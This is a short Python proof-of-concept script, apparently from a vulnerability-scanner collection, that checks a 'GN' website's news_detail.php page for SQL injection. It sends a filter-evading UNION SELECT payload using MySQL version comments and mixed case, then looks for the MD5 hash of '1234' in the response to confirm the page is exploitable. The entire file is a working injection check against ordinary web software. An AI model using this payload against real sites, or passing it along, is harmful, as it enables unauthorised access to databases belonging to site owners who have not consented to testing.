#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: GN SQL Injection
referer: unknown
author: Lucifer
description: GN SQL injection。
'''
import sys
import requests
import warnings
def run(url):
        result = ['GN SQL Injection','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/news_detail.php?sn=-7%27+/*!50000UnIoN*/+SeLeCt+1,2,3,Md5(1234),5,6,7--%20-"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
